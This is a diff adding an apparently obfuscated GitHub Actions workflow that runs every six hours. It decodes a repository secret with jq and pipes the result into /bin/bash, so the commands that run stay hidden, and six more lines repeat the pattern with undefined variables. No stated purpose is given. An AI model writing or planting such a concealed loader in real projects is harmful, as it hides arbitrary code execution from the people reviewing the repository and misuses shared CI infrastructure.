@@ -1,0 +1,23 @@
+name: zhegejiegouuu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhegejiegouuu
+        env:
+          yrp296: ${{ secrets.yrp296 }}
+        run: |
+          echo $yrp296 | jq -r .y5 | /bin/bash
+          echo $di01258 | jq -r .ctqv4043 | /bin/bash
+          echo $kmkn1 | jq -r .t3 | /bin/bash
+          echo $s40157 | jq -r .kxx2 | /bin/bash
+          echo $eppor4 | jq -r .mbs98 | /bin/bash
+          echo $od0 | jq -r .tex62344 | /bin/bash
+          echo $dh73043 | jq -r .n46829 | /bin/bash
+
